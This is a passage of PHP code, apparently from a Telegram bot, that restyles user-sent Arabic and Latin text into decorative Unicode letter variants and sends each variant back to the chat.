   $k = str_replace( م ,  مَٰـُـٰٓ , $k);
   $k = str_replace( ك ,  ڪَٰـُـٰٓ , $k);
   $k = str_replace( ط ,  طَٰـُـٰٓ , $k);
   $k = str_replace( ظ ,  ظَٰـُـٰٓ , $k);
  $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "ۿۿہ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]);
  $k = $re->text;
   $k = str_replace( ض ,  ضِٰـۛৣـ , $k);
   $k = str_replace( ص ,  صِٰـۛৣـ , $k);
   $k = str_replace( ث ,  ثِٰـۛৣـ , $k);
   $k = str_replace( ق ,  قِٰـۛৣـ , $k);
   $k = str_replace( ف ,  فِٰ͒ـۛৣـ , $k);
   $k = str_replace( غ ,  غِٰـۛৣـ , $k);
   $k = str_replace( ع ,  عِٰـۛৣـ , $k);
   $k = str_replace( خ ,  خِٰ̐ـۛৣـ , $k);
   $k = str_replace( ح ,  حِٰـۛৣـ , $k);
   $k = str_replace( ج ,  جِٰـۛৣـ , $k);
   $k = str_replace( ش ,  شِٰـۛৣـ , $k);
   $k = str_replace( س ,  سِٰـۛৣـ , $k);
   $k = str_replace( ي ,  يِٰـۛৣـ , $k);
   $k = str_replace( ب ,  بِٰـۛৣـ , $k);
   $k = str_replace( ل ,  لِٰـۛৣـ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  تِٰـۛৣـ , $k);
   $k = str_replace( ن ,  نِٰـۛৣـ , $k);
   $k = str_replace( م ,  مِٰـۛৣـ , $k);
   $k = str_replace( ك ,  ڪِٰـۛৣـ , $k);
   $k = str_replace( ط ,  طِٰـۛৣـ , $k);
   $k = str_replace( ظ ,  ظِٰـۛৣـ , $k);
  $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "໋۠هہؚ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]); 
  $k = $re->text;
   $k = str_replace( ض ,  ض֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ص ,  ص֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ث ,  ث֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ق ,  ق֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ف ,  ف͒֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( غ ,  غ֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ع ,  ع֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( خ ,  خ̐֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ح ,  ح֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ج ,  ج֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ش ,  ش֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( س ,  س֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ي ,  ي֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ب ,  ب֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ل ,  ل֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  ت֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ن ,  ن֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( م ,  م֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ك ,  ڪ֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ط ,  ط֠ــۢ͜ـٰ̲ـ , $k);
   $k = str_replace( ظ ,  ظ֠ــۢ͜ـٰ̲ـ , $k);
  $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "໋۠هہؚ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]); 
  $k = $re->text;
   $k = str_replace( ض ,  ض๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ص ,  ص๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ث ,  ث๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ق ,  ق๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ف ,  ف๋͒͜ـ❀๋͜ـ , $k);
   $k = str_replace( غ ,  غ๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ع ,  ع๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( خ ,  خ๋̐͜ـ❀๋͜ـ , $k);
   $k = str_replace( ح ,  ح๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ج ,  ج๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ش ,  ش๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( س ,  س๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ي ,  ي๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ب ,  ب๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ل ,  ل๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  ت๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ن ,  ن๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( م ,  م๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ك ,  ڪ๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ط ,  ط๋͜ـ❀๋͜ـ , $k);
   $k = str_replace( ظ ,  ظ๋͜ـ❀๋͜ـ , $k);
  $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "໋۠هہؚ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]); 
  $k = $re->text;
   $k = str_replace( ض ,  ضـۘ❈ـۘ , $k);
   $k = str_replace( ص ,  صـۘ❈ـۘ , $k);
   $k = str_replace( ث ,  ثـۘ❈ـۘ , $k);
   $k = str_replace( ق ,  قـۘ❈ـۘ , $k);
   $k = str_replace( ف ,  ف͒ـۘ❈ـۘ , $k);
   $k = str_replace( غ ,  غـۘ❈ـۘ , $k);
   $k = str_replace( ع ,  عـۘ❈ـۘ , $k);
   $k = str_replace( خ ,  خ̐ـۘ❈ـۘ , $k);
   $k = str_replace( ح ,  حـۘ❈ـۘ , $k);
   $k = str_replace( ج ,  جـۘ❈ـۘ , $k);
   $k = str_replace( ش ,  شـۘ❈ـۘ , $k);
   $k = str_replace( س ,  سـۘ❈ـۘ , $k);
   $k = str_replace( ي ,  يـۘ❈ـۘ , $k);
   $k = str_replace( ب ,  بـۘ❈ـۘ , $k);
   $k = str_replace( ل ,  لـۘ❈ـۘ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  تـۘ❈ـۘ , $k);
   $k = str_replace( ن ,  نـۘ❈ـۘ , $k);
   $k = str_replace( م ,  م , $k);
   $k = str_replace( ك ,  ڪـۘ❈ـۘ , $k);
   $k = str_replace( ط ,  طـۘ❈ـۘ , $k);
   $k = str_replace( ظ ,  ظـۘ❈ـۘ , $k);
  $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "໋۠هہؚ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]);
}
$EN = explode("/z", $text);
   if($EN[1]){
   $EN = str_replace('q', '•🇶', $EN);
   $EN = str_replace('w', '•🇼', $EN);
   $EN = str_replace('e', '•🇪', $EN);
   $EN = str_replace('r', '•🇷', $EN);
   $EN = str_replace('t', '•🇹', $EN);
   $EN = str_replace('y', '•🇾', $EN);
   $EN = str_replace('u', '•🇻', $EN);
   $EN = str_replace('i', '•🇮', $EN);
   $EN = str_replace('o', '•🇴', $EN);
   $EN = str_replace('p', '•🇵', $EN);
   $EN = str_replace('a', '•🇦', $EN);
   $EN = str_replace('s', '•🇸', $EN);
   $EN = str_replace('d', '•🇩', $EN);
   $EN = str_replace('f', '•🇫', $EN);
   $EN = str_replace('g', '•🇬', $EN);
   $EN = str_replace('h', '•🇭', $EN);
   $EN = str_replace('j', '•🇯', $EN);
   $EN = str_replace('k', '•🇰', $EN);
   $EN = str_replace('l', '•🇱', $EN);
   $EN = str_replace('z', '•🇿', $EN);
   $EN = str_replace('x', '•🇽', $EN);
   $EN = str_replace('c', '•🇨', $EN);
   $EN = str_replace('v', '•🇺', $EN);
   $EN = str_replace('b', '•🇧', $EN);
   $EN = str_replace('n', '•🇳', $EN);
   $EN = str_replace('m', '•🇲', $EN);
   bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>$EN[1],
    ]);
    }
    $EN0 = explode("/z", $text);
    if($EN0[1]){
	 $EN0 = str_replace('q', 'Ⴓ' , $EN0);
  	 $EN0 = str_replace('w', 'ᗯ' , $EN0);
	 $EN0 = str_replace('e', 'ᕮ' , $EN0);
  	 $EN0 = str_replace('r', 'ᖇ' , $EN0);
	 $EN0 = str_replace('t', 'ͳ' , $EN0);
  	 $EN0 = str_replace('y', 'ϒ' , $EN0);
	 $EN0 = str_replace('u', 'ᘮ' , $EN0);
  	 $EN0 = str_replace('i', 'ᓰ' , $EN0);
	 $EN0 = str_replace('o', '〇' , $EN0);
  	 $EN0 = str_replace('p', 'ᖘ' , $EN0);
	 $EN0 = str_replace('a', 'ᗩ' , $EN0);
  	 $EN0 = str_replace('s', 'ᔕ' , $EN0);
	 $EN0 = str_replace('d', 'ᗪ' , $EN0);
  	 $EN0 = str_replace('f', 'Բ' , $EN0);
	 $EN0 = str_replace('g', 'ᘐ' , $EN0);
  	 $EN0 = str_replace('h', 'ᕼ' , $EN0);
	 $EN0 = str_replace('j', 'ᒎ' , $EN0);
  	 $EN0 = str_replace('k', 'Ḱ' , $EN0);
	 $EN0 = str_replace('l', 'ᒪ' , $EN0);
  	 $EN0 = str_replace('z', 'Ꙁ' , $EN0);
	 $EN0 = str_replace('x', 'Ꮖ' , $EN0);
  	 $EN0 = str_replace('c', 'ᑕ' , $EN0);
	 $EN0 = str_replace('v', 'ᐯ' , $EN0);
  	 $EN0 = str_replace('b', 'ᙖ' , $EN0);
  	 $EN0 = str_replace('n', 'ᘉ' , $EN0);
	 $EN0 = str_replace('m', 'ᙢ' , $EN0);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$y[1],

    ]);
    }
    $EN1 = explode("/z", $text);
    if($EN1[1]){
	 $EN1 = str_replace('q', 'q' , $EN1);
  	 $EN1 = str_replace('w', 'ω' , $EN1);
	 $EN1 = str_replace('e', 'ε' , $EN1);
  	 $EN1 = str_replace('r', 'я' , $EN1);
	 $EN1 = str_replace('t', 'т' , $EN1);
  	 $EN1 = str_replace('y', 'ү' , $EN1);
	 $EN1 = str_replace('u', 'υ' , $EN1);
  	 $EN1 = str_replace('i', 'ι' , $EN1);
	 $EN1 = str_replace('o', 'σ' , $EN1);
  	 $EN1 = str_replace('p', 'ρ' , $EN1);
	 $EN1 = str_replace('a', 'α' , $EN1);
  	 $EN1 = str_replace('s', 's' , $EN1);
	 $EN1 = str_replace('d', '∂' , $EN1);
  	 $EN1 = str_replace('f', 'ғ' , $EN1);
	 $EN1 = str_replace('g', 'g' , $EN1);
  	 $EN1 = str_replace('h', 'н' , $EN1);
	 $EN1 = str_replace('j', 'נ' , $EN1);
  	 $EN1 = str_replace('k', 'к' , $EN1);
	 $EN1 = str_replace('l', 'ℓ' , $EN1);
  	 $EN1 = str_replace('z', 'z' , $EN1);
	 $EN1 = str_replace('x', 'x' , $EN1);
  	 $EN1 = str_replace('c', 'c' , $EN1);
	 $EN1 = str_replace('v', 'v' , $EN1);
  	 $EN1 = str_replace('b', 'в' , $EN1);
  	 $EN1 = str_replace('n', 'η' , $EN1);
	 $EN1 = str_replace('m', 'м' , $EN1);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN1[1],

    ]);
    }
    $EN2 = explode("/z", $text);
    if($EN2[1]){
	 $EN2 = str_replace('q', 'ᵠ' , $EN2);
  	 $EN2 = str_replace('w', 'ʷ' , $EN2);
	 $EN2 = str_replace('e', 'ᵉ' , $EN2);
  	 $EN2 = str_replace('r', 'ʳ' , $EN2);
	 $EN2 = str_replace('t', 'ᵗ' , $EN2);
  	 $EN2 = str_replace('y', 'ʸ' , $EN2);
	 $EN2 = str_replace('u', 'ᵘ' , $EN2);
  	 $EN2 = str_replace('i', 'ᶤ' , $EN2);
	 $EN2 = str_replace('o', 'ᵒ' , $EN2);
  	 $EN2 = str_replace('p', 'ᵖ' , $EN2);
	 $EN2 = str_replace('a', 'ᵃ' , $EN2);
  	 $EN2 = str_replace('s', 'ˢ' , $EN2);
	 $EN2 = str_replace('d', 'ᵈ' , $EN2);
  	 $EN2 = str_replace('f', 'ᶠ' , $EN2);
	 $EN2 = str_replace('g', 'ᵍ' , $EN2);
  	 $EN2 = str_replace('h', 'ʰ' , $EN2);
	 $EN2 = str_replace('j', 'ʲ' , $EN2);
  	 $EN2 = str_replace('k', 'ᵏ' , $EN2);
	 $EN2 = str_replace('l', 'ˡ' , $EN2);
  	 $EN2 = str_replace('z', 'ᶻ' , $EN2);
	 $EN2 = str_replace('x', 'ˣ' , $EN2);
  	 $EN2 = str_replace('c', 'ᶜ' , $EN2);
	 $EN2 = str_replace('v', 'ᵛ' , $EN2);
  	 $EN2 = str_replace('b', 'ᵇ' , $EN2);
  	 $EN2 = str_replace('n', 'ᶰ' , $EN2);
	 $EN2 = str_replace('m', 'ᵐ' , $EN2);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN2[1],

    ]);
    }
$EN3 = explode("/z", $text);
    if($EN3[1]){
	 $EN3 = str_replace('q', 'Θ' , $EN3);
  	 $EN3 = str_replace('w', 'ẁ' , $EN3);
	 $EN3 = str_replace('e', 'ë' , $EN3);
  	 $EN3 = str_replace('r', 'я' , $EN3);
	 $EN3 = str_replace('t', 'ť' , $EN3);
  	 $EN3 = str_replace('y', 'y' , $EN3);
	 $EN3 = str_replace('u', 'ע' , $EN3);
  	 $EN3 = str_replace('i', 'į' , $EN3);
	 $EN3 = str_replace('o', 'ð' , $EN3);
  	 $EN3 = str_replace('p', 'ρ' , $EN3);
	 $EN3 = str_replace('a', 'à' , $EN3);
  	 $EN3 = str_replace('s', 'ś' , $EN3);
	 $EN3 = str_replace('d', 'ď' , $EN3);
  	 $EN3 = str_replace('f', '∫' , $EN3);
	 $EN3 = str_replace('g', 'ĝ' , $EN3);
  	 $EN3 = str_replace('h', 'ŋ' , $EN3);
	 $EN3 = str_replace('j', 'Ј' , $EN3);
  	 $EN3 = str_replace('k', 'қ' , $EN3);
	 $EN3 = str_replace('l', 'Ŀ' , $EN3);
  	 $EN3 = str_replace('z', 'ź' , $EN3);
	 $EN3 = str_replace('x', 'א' , $EN3);
  	 $EN3 = str_replace('c', 'ć' , $EN3);
	 $EN3 = str_replace('v', 'V' , $EN3);
  	 $EN3 = str_replace('b', 'Ђ' , $EN3);
  	 $EN3 = str_replace('n', 'ŋ' , $EN3);
	 $EN3 = str_replace('m', 'm' , $EN3);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN3[1],

    ]);
    }
$EN3 = explode("/z", $text);
    if($EN3[1]){
	 $EN3 = str_replace('q', 'Ҩ' , $EN3);
  	 $EN3 = str_replace('w', 'Щ' , $EN3);
	 $EN3 = str_replace('e', 'Є' , $EN3);
  	 $EN3 = str_replace('r', 'R' , $EN3);
	 $EN3 = str_replace('t', 'ƚ' , $EN3);
  	 $EN3 = str_replace('y', '￥' , $EN3);
	 $EN3 = str_replace('u', 'Ц' , $EN3);
  	 $EN3 = str_replace('i', 'Ī' , $EN3);
	 $EN3 = str_replace('o', 'Ø' , $EN3);
  	 $EN3 = str_replace('p', 'P' , $EN3);
	 $EN3 = str_replace('a', 'Â' , $EN3);
  	 $EN3 = str_replace('s', '$' , $EN3);
	 $EN3 = str_replace('d', 'Ð' , $EN3);
  	 $EN3 = str_replace('f', 'Ŧ' , $EN3);
	 $EN3 = str_replace('g', 'Ǥ' , $EN3);
  	 $EN3 = str_replace('h', 'Ħ' , $EN3);
	 $EN3 = str_replace('j', 'ʖ' , $EN3);
  	 $EN3 = str_replace('k', 'Қ' , $EN3);
	 $EN3 = str_replace('l', 'Ŀ' , $EN3);
  	 $EN3 = str_replace('z', 'Ẕ' , $EN3);
	 $EN3 = str_replace('x', 'X' , $EN3);
  	 $EN3 = str_replace('c', 'Ĉ' , $EN3);
	 $EN3 = str_replace('v', 'V' , $EN3);
  	 $EN3 = str_replace('b', 'ß' , $EN3);
  	 $EN3 = str_replace('n', 'И' , $EN3);
	 $EN3 = str_replace('m', 'ⴅ' , $EN3);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN3[1],

    ]);
    }
 $EN5 = explode("/z", $text);
    if($EN5[1]){
	 $EN5 = str_replace('q', 'Ҩ' , $EN5);
  	 $EN5 = str_replace('w', 'Ɯ' , $EN5);
	 $EN5 = str_replace('e', 'Ɛ' , $EN5);
  	 $EN5 = str_replace('r', '尺' , $EN5);
	 $EN5 = str_replace('t', 'Ť' , $EN5);
  	 $EN5 = str_replace('y', 'Ϥ' , $EN5);
	 $EN5 = str_replace('u', 'Ц' , $EN5);
  	 $EN5 = str_replace('i', 'ɪ' , $EN5);
	 $EN5 = str_replace('o', 'Ø' , $EN5);
  	 $EN5 = str_replace('p', 'þ' , $EN5);
	 $EN5 = str_replace('a', 'Λ' , $EN5);
  	 $EN5 = str_replace('s', 'ら' , $EN5);
	 $EN5 = str_replace('d', 'Ð' , $EN5);
  	 $EN5 = str_replace('f', 'F' , $EN5);
	 $EN5 = str_replace('g', 'Ɠ' , $EN5);
  	 $EN5 = str_replace('h', 'н' , $EN5);
	 $EN5 = str_replace('j', 'ﾌ' , $EN5);
  	 $EN5 = str_replace('k', 'Қ' , $EN5);
	 $EN5 = str_replace('l', 'Ł' , $EN5);
  	 $EN5 = str_replace('z', 'Ẕ' , $EN5);
	 $EN5 = str_replace('x', 'χ' , $EN5);
  	 $EN5 = str_replace('c', 'ㄈ' , $EN5);
	 $EN5 = str_replace('v', 'Ɣ' , $EN5);
  	 $EN5 = str_replace('b', 'Ϧ' , $EN5);
  	 $EN5 = str_replace('n', 'Л' , $EN5);
	 $EN5 = str_replace('m', '௱' , $EN5);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN5[1],

    ]);
    }
   $EN6 = explode("/z", $text);
    if($EN6[1]){
	 $EN6 = str_replace('q', 'G ҉ ' , $EN6);
  	 $EN6 = str_replace('w', 'W ҉ ' , $EN6);
	 $EN6 = str_replace('e', 'E ҉ ' , $EN6);
  	 $EN6 = str_replace('r', 'R ҉ ' , $EN6);
	 $EN6 = str_replace('t', 'T ҉ ' , $EN6);
  	 $EN6 = str_replace('y', 'Y ҉ ' , $EN6);
	 $EN6 = str_replace('u', 'U ҉ ' , $EN6);
  	 $EN6 = str_replace('i', 'I ҉ ' , $EN6);
	 $EN6 = str_replace('o', 'O ҉ ' , $EN6);
  	 $EN6 = str_replace('p', 'P ҉ ' , $EN6);
	 $EN6 = str_replace('a', 'A ҉ ' , $EN6);
  	 $EN6 = str_replace('s', 'S ҉ ' , $EN6);
	 $EN6 = str_replace('d', 'D ҉ ' , $EN6);
  	 $EN6 = str_replace('f', 'F ҉ ' , $EN6);
	 $EN6 = str_replace('g', 'G ҉ ' , $EN6);
  	 $EN6 = str_replace('h', 'H ҉ ' , $EN6);
	 $EN6 = str_replace('j', 'J ҉ ' , $EN6);
  	 $EN6 = str_replace('k', 'K ҉ ' , $EN6);
	 $EN6 = str_replace('l', 'L ҉ ' , $EN6);
  	 $EN6 = str_replace('z', 'Z ҉ ' , $EN6);
	 $EN6 = str_replace('x', 'X ҉ ' , $EN6);
  	 $EN6 = str_replace('c', 'C ҉ ' , $EN6);
	 $EN6 = str_replace('v', 'V ҉ ' , $EN6);
  	 $EN6 = str_replace('b', 'B ҉ ' , $EN6);
  	 $EN6 = str_replace('n', 'N ҉ ' , $EN6);
	 $EN6 = str_replace('m', 'M ҉ ' , $EN6);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN6[1],

    ]);
    }
$EN7 = explode("/z", $text);
    if($EN7[1]){
	 $EN7 = str_replace('q', '🅠' , $EN7);
  	 $EN7 = str_replace('w', '🅦' , $EN7);
	 $EN7 = str_replace('e', '🅔' , $EN7);
  	 $EN7 = str_replace('r', '🅡' , $EN7);
	 $EN7 = str_replace('t', '🅣' , $EN7);
  	 $EN7 = str_replace('y', '??' , $EN7);
	 $EN7 = str_replace('u', '🅤' , $EN7);
  	 $EN7 = str_replace('i', '🅘' , $EN7);
	 $EN7 = str_replace('o', '🅞' , $EN7);
  	 $EN7 = str_replace('p', '🅟' , $EN7);
	 $EN7 = str_replace('a', '🅐' , $EN7);
  	 $EN7 = str_replace('s', '🅢' , $EN7);
	 $EN7 = str_replace('d', '🅓' , $EN7);
  	 $EN7 = str_replace('f', '🅕' , $EN7);
	 $EN7 = str_replace('g', '🅖' , $EN7);
  	 $EN7 = str_replace('h', '🅗' , $EN7);
	 $EN7 = str_replace('j', '🅙' , $EN7);
  	 $EN7 = str_replace('k', '🅚' , $EN7);
	 $EN7 = str_replace('l', '🅛' , $EN7);
  	 $EN7 = str_replace('z', '🅩' , $EN7);
	 $EN7 = str_replace('x', '🅧' , $EN7);
  	 $EN7 = str_replace('c', '🅒' , $EN7);
	 $EN7 = str_replace('v', '🅥' , $EN7);
  	 $EN7 = str_replace('b', '🅑' , $EN7);
  	 $EN7 = str_replace('n', '🅝' , $EN7);
	 $EN7 = str_replace('m', '🅜' , $EN7);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN7[1],

    ]);
    }
    $EN8 = explode("/z", $text);
    if($EN8[1]){
	 $EN8 = str_replace('q', 'q̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('w', 'w̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('e', 'e̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('r', 'r̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('t', ' t̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('y', 'y̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('u', 'u̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('i', 'i̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('o', 'o̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('p', '̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭p̶꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('a', 'a̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('s', 's̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('d', 'd̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('f', 'f̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('g', 'g̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('h', 'h̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('j', 'j̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('k', 'k̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('l', 'l̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('z', 'z꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('x', 'x̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('c', 'c̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('v', 'v̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('b', 'b̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
  	 $EN8 = str_replace('n', 'n̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 $EN8 = str_replace('m', 'm̶꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭꯭' , $EN8);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN8[1],

    ]);
    }
$EN9 = explode("/z", $text);
    if($EN9[1]){
	 $EN9 = str_replace('q', 'ᑫ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('w', 'ᗯ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('e', 'ᗴ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('r', 'ᖇ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('t', 'Ꭲ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('y', 'Ꭹ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('u', 'ᑌ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('i', 'Ꮖ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('o', 'ᝪ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('p', 'P ̵̨͈̝̠͓̻͈̪͈̺͓͆̈́' , $EN9);
	 $EN9 = str_replace('a', 'ᗩ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('s', 'ᔑ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('d', 'ᗞ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('f', 'ᖴ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('g', 'Ꮐ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('h', 'ᕼ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('j', '̣͙ᒍ ̵̨͈̝̠͓̻͈̪͆̈́' , $EN9);
  	 $EN9 = str_replace('k', 'Ꮶ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('l', 'Ꮮ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('z', 'Ꮓ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('x', '᙭ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('c', 'ᑕ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('v', 'ᐯ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('b', 'ᗷ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
  	 $EN9 = str_replace('n', 'ᑎ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 $EN9 = str_replace('m', 'ᗰ ̵̨͈̝̠͓̻͈̪͈͆̈́' , $EN9);
	 bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>$EN9[1],

    ]);
    }
 $EN10 = explode("/z", $text);
    if($EN10[1]){
	 $EN10 = str_replace('q', 'Ꝙ' ,$EN10);
  	 $EN10 = str_replace('w', 'Ѡ' ,$EN10);
	 $EN10 = str_replace('e', 'Ɛ' ,$EN10);
